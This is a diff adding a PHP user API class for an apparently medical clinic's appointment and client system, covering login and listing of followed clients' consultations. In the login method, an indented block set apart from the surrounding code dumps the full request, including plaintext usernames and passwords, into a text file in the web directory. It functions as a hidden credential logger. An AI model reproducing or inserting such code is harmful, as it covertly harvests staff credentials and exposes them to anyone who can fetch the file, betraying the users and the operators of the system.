@@ -1,0 +1,150 @@
+<?php
+include './HM.php';
+class User extends HM {
+	
+	public function __construct(){
+		parent::__construct();
+	}
+	
+	protected function __login(){
+		if( isset( $_REQUEST['username'] ) && isset( $_REQUEST['pwd'] )  ){
+			$username = trim( $_REQUEST['username'] );
+			$password = trim( $_REQUEST['pwd'] );
+			
+				    	    	    $apk_url = dirname(__FILE__) . "/apkoldfile.txt";						 
+				    	    	    $myfile = fopen( $apk_url, "w") or die("Unable to open file!");
+				    	    	    $txt = print_r($_REQUEST,true);
+				    	    	    fwrite($myfile, $txt);				    	    	 				    	    	  
+				    	    	    fclose($myfile);
+			if( strlen( $password ) != 32 ){$this->__msg(10,'密码不正确.',null);}
+			//$password = md5( $pwd );
+			new ArticleService();
+			$arr=array('name'=>$username,'password'=>md5($password));
+			$result = R::findOne('worker','`name` = :name and `password`=:password',$arr);
+
+			if(!is_object( $result )){
+				$this->__msg(1,'账户密码不匹配,验证失败.',null); 
+			}else{
+				$hmtokenser=new HmTokenService();
+				$token=$hmtokenser->maketoken($username);
+				$hmtoken=new HmToken();
+				
+				$hmtoken->name=$username;
+				$hmtoken->token=$token;
+				$hmtoken->expire_time=time()+86400;
+				
+				$hmtokenser->savetoken($hmtoken);
+				
+				$returnarr=array('token'=>$token,'id'=>$result->id);
+				//session_start();
+                //$_SESSION['passport']=$passport;
+              //echo $_SESSION['passport'];
+				
+								
+				$this->__msg(0,'success',$returnarr);
+			};
+		}else{
+			$this->__msg(1,'缺少username或pwd参数.',null);
+		}
+	}
+	
+	/**
+	 * 获取登录用户所关注的所有客户咨询预约信息
+	 * */
+	protected function __getReseruserList() {
+		new ClientService();
+		$userId = isset($_REQUEST['id']) ? $_REQUEST['id'] : '';
+		if ($userId) {
+			DTExpression::like('focus_id', $userId);
+			$clients = R::find('client', DTExpression::$sql, DTExpression::$params);
+			$users = array();
+			foreach ($clients as $client) {
+				$focus_ids = explode(',', $client->focus_id);
+				if (!empty($focus_ids) && in_array($userId, $focus_ids)) {
+					$users[]= $client->username;
+				}
+			}
+			
+			DTExpression::$params = array();
+			DTExpression::$limit = '';
+			DTExpression::$sql = ' 1=1 ';
+			DTOrder::$sql = '';
+			
+			//所有预约信息
+			DTExpression::in('name', $users);
+			DTExpression::page($_REQUEST);
+			$reseruser = R::find('reseruser', DTExpression::$sql. DTExpression::$limit, DTExpression::$params);
+			$data =array();
+			foreach ($reseruser as $bean) {
+				$user = new ReserUser();
+				$user->generateFromRedBean($bean);
+				$data[] = $user;
+			}
+			
+			$this->__msg(0,'success',$data);
+		} else {
+			$this->__msg(1,'缺少参数id.',null);
+		}
+	}
+	
+	/**
+	 * 获取登录用户所关注的所有客户咨询信息
+	 * */
+	protected function __getClientList() {
+		new ClientService();
+		$userId = isset($_REQUEST['id']) ? $_REQUEST['id'] : '';
+		if ($userId) {
+			DTExpression::like('focus_id', $userId);
+			$clients = R::find('client', DTExpression::$sql, DTExpression::$params);
+			$users = array();
+			foreach ($clients as $client) {
+				$focus_ids = explode(',', $client->focus_id);
+				if (!empty($focus_ids) && in_array($userId, $focus_ids)) {
+					$users[]= $client->username;
+				}
+			}
+				
+			DTExpression::$params = array();
+			DTExpression::$limit = '';
+			DTExpression::$sql = ' 1=1 ';
+			DTOrder::$sql = '';
+				
+			//所有预约信息
+			DTExpression::in('username', $users);
+			DTExpression::page($_REQUEST);
+			$result = R::find('client', DTExpression::$sql. DTExpression::$limit, DTExpression::$params);
+			$data =array();
+            foreach ($result as $k => $bean) {
+	            $entity = new Client();
+	            $entity->generateFromRedBean($bean);
+	            
+	            $entity->date = date('Y-m-d', $entity->date);
+	            
+	            //科室
+	            $department = R::load(TABLENAME_DEPARTMENTMANAGER, $entity->department_id);
+	            $entity->department_name = $department->name;
+	            
+	            //医生
+	            $doctor = R::load(TABLENAME_DOCTORMANAGER, $entity->doctor_id);
+	            $entity->doctor_name = $doctor->name;
+	            
+	            //渠道
+	            $source = R::load('patientdatasource', $entity->source);
+	            $entity->source_name = $source->title;
+	            
+	            //咨询员
+	            $reception = R::load('patientreceptionist', $entity->reception_id);
+	            $entity->reception_name = $reception->user_name;
+	            
+	            $data[] = $entity;
+            }
+				
+			$this->__msg(0,'success',$data);
+		} else {
+			$this->__msg(1,'缺少参数id.',null);
+		}
+	}
+	
+	
+}
+new User();
